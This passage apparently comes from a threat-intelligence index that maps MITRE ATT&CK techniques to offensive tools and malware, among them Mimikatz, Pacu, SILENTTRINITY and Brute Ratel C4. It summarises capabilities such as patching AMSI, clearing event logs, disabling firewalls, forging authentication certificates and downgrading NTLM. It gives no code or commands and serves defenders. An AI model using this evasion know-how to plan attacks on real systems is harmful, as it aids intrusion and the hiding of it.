- [PowerSploit](../tools/unknown/powersploit.md) — explicit, source. [PowerSploit](https://attack.mitre.org/software/S0194) reflectively loads a Windows PE file into a process.(Citation: GitHub PowerSploit May 2012)(Citation: PowerSploit Documentation)
- [SILENTTRINITY](../tools/unknown/silenttrinity.md) — explicit, source. [SILENTTRINITY](https://attack.mitre.org/software/S0692) can run a .NET executable within the memory of a sacrificial process by loading the CLR.(Citation: Github_SILENTTRINITY)  

## T1622 - Debugger Evasion

- [AsyncRAT](../tools/unknown/asyncrat.md) — explicit, source. [AsyncRAT](https://attack.mitre.org/software/S1087) can use the `CheckRemoteDebuggerPresent` function to detect the presence of a debugger.(Citation: Telefonica Snip3 December 2021)

## T1648 - Serverless Execution

- [Pacu](../tools/unknown/pacu.md) — explicit, source. [Pacu](https://attack.mitre.org/software/S1091) can create malicious Lambda functions.(Citation: GitHub Pacu)

## T1649 - Steal or Forge Authentication Certificates

- [AADInternals](../tools/unknown/aadinternals.md) — explicit, source. [AADInternals](https://attack.mitre.org/software/S0677) can create and export various authentication certificates, including those associated with Azure AD joined/registered devices.(Citation: AADInternals Documentation)
- [Mimikatz](../tools/unknown/mimikatz.md) — explicit, source. [Mimikatz](https://attack.mitre.org/software/S0002)'s `CRYPTO` module can create and export various types of authentication certificates.(Citation: Adsecurity Mimikatz Guide)

## T1651 - Cloud Administration Command

- [AADInternals](../tools/unknown/aadinternals.md) — explicit, source. [AADInternals](https://attack.mitre.org/software/S0677) can execute commands on Azure virtual machines using the VM agent.(Citation: AADInternals Root Access to Azure VMs)
- [Pacu](../tools/unknown/pacu.md) — explicit, source. [Pacu](https://attack.mitre.org/software/S1091) can run commands on EC2 instances using AWS Systems Manager Run Command.(Citation: GitHub Pacu)

## T1654 - Log Enumeration

- [Pacu](../tools/unknown/pacu.md) — explicit, source. [Pacu](https://attack.mitre.org/software/S1091) can collect CloudTrail event histories and CloudWatch logs.(Citation: GitHub Pacu)

## T1680 - Local Storage Discovery

- [AsyncRAT](../tools/unknown/asyncrat.md) — explicit, source. [AsyncRAT](https://attack.mitre.org/software/S1087) can check the disk size through the values obtained with `DeviceInfo.`(Citation: Telefonica Snip3 December 2021)
- [CrackMapExec](../tools/unknown/crackmapexec.md) — explicit, source. [CrackMapExec](https://attack.mitre.org/software/S0488) can enumerate the system drives and associated system name.(Citation: CME Github September 2018)
- [SILENTTRINITY](../tools/unknown/silenttrinity.md) — explicit, source. [SILENTTRINITY](https://attack.mitre.org/software/S0692) can collect information related to a compromised host, including a list of drives.(Citation: GitHub SILENTTRINITY Modules July 2019)

## T1684.001 - Impersonation

- [NPPSPY](../tools/unknown/nppspy.md) — explicit, source. [NPPSPY](https://attack.mitre.org/software/S1131) creates a network listener using the misspelled label <code>logincontroll</code> recorded to the Registry key <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\NetworkProvider\\Order</code>.(Citation: Huntress NPPSPY 2022)

## T1685 - Disable or Modify Tools

- [Brute Ratel C4](../tools/unknown/brute-ratel-c4.md) — explicit, source. [Brute Ratel C4](https://attack.mitre.org/software/S1063) has the ability to hide memory artifacts and to patch Event Tracing for Windows (ETW) and the Anti Malware Scan Interface (AMSI).(Citation: Palo Alto Brute Ratel July 2022)(Citation: MDSec Brute Ratel August 2022)
- [DCRAT](../tools/unknown/dcrat.md) — explicit, source. [DCRAT](https://attack.mitre.org/software/S9017) can patch Microsoft’s Antimalware Scan Interface (AMSI) to evade detection.(Citation: Zscaler BlindEagle DEC 2025)
- [Donut](../tools/unknown/donut.md) — explicit, source. [Donut](https://attack.mitre.org/software/S0695) can patch Antimalware Scan Interface (AMSI), Windows Lockdown Policy (WLDP), as well as exit-related [Native API](https://attack.mitre.org/techniques/T1106) functions to avoid process termination.(Citation: Donut Github)	
- [Imminent Monitor](../tools/unknown/imminent-monitor.md) — explicit, source. [Imminent Monitor](https://attack.mitre.org/software/S0434) has a feature to disable Windows Task Manager.(Citation: Imminent Unit42 Dec2019)	
- [SILENTTRINITY](../tools/unknown/silenttrinity.md) — explicit, source. [SILENTTRINITY](https://attack.mitre.org/software/S0692)'s `amsiPatch.py` module can disable Antimalware Scan Interface (AMSI) functions.(Citation: GitHub SILENTTRINITY Modules July 2019)

## T1685.001 - Disable or Modify Windows Event Log

- [Wevtutil](../tools/unknown/wevtutil.md) — explicit, source. [Wevtutil](https://attack.mitre.org/software/S0645) can be used to disable specific event logs on the system.(Citation: Wevtutil Microsoft Documentation)

## T1685.002 - Disable or Modify Cloud Log

- [Pacu](../tools/unknown/pacu.md) — explicit, source. [Pacu](https://attack.mitre.org/software/S1091) can disable or otherwise restrict various AWS logging services, such as AWS CloudTrail and VPC flow logs.(Citation: GitHub Pacu)

## T1685.005 - Clear Windows Event Logs

- [Pupy](../tools/unknown/pupy.md) — explicit, source. [Pupy](https://attack.mitre.org/software/S0192) has a module to clear event logs with PowerShell.(Citation: GitHub Pupy)
- [Wevtutil](../tools/unknown/wevtutil.md) — explicit, source. [Wevtutil](https://attack.mitre.org/software/S0645) can be used to clear system and security event logs from the system.(Citation: Wevtutil Microsoft Documentation)(Citation: Crowdstrike DNC June 2016)

## T1686 - Disable or Modify System Firewall

- [netsh](../tools/unknown/netsh.md) — explicit, source. [netsh](https://attack.mitre.org/software/S0108) can be used to disable local firewall settings.(Citation: TechNet Netsh)(Citation: TechNet Netsh Firewall)

## T1686.001 - Cloud Firewall

- [Pacu](../tools/unknown/pacu.md) — explicit, source. [Pacu](https://attack.mitre.org/software/S1091) can allowlist IP addresses in AWS GuardDuty.(Citation: GitHub Pacu)

## T1689 - Downgrade Attack

- [SILENTTRINITY](../tools/unknown/silenttrinity.md) — explicit, source. [SILENTTRINITY](https://attack.mitre.org/software/S0692) can downgrade NTLM to capture NTLM hashes.(Citation: Github_SILENTTRINITY) 

## T1690 - Prevent Command History Logging

- [SILENTTRINITY](../tools/unknown/silenttrinity.md) — explicit, source. [SILENTTRINITY](https://attack.mitre.org/software/S0692) can bypass ScriptBlock logging to execute unmanaged PowerShell code from memory.(Citation: GitHub SILENTTRINITY Modules July 2019)
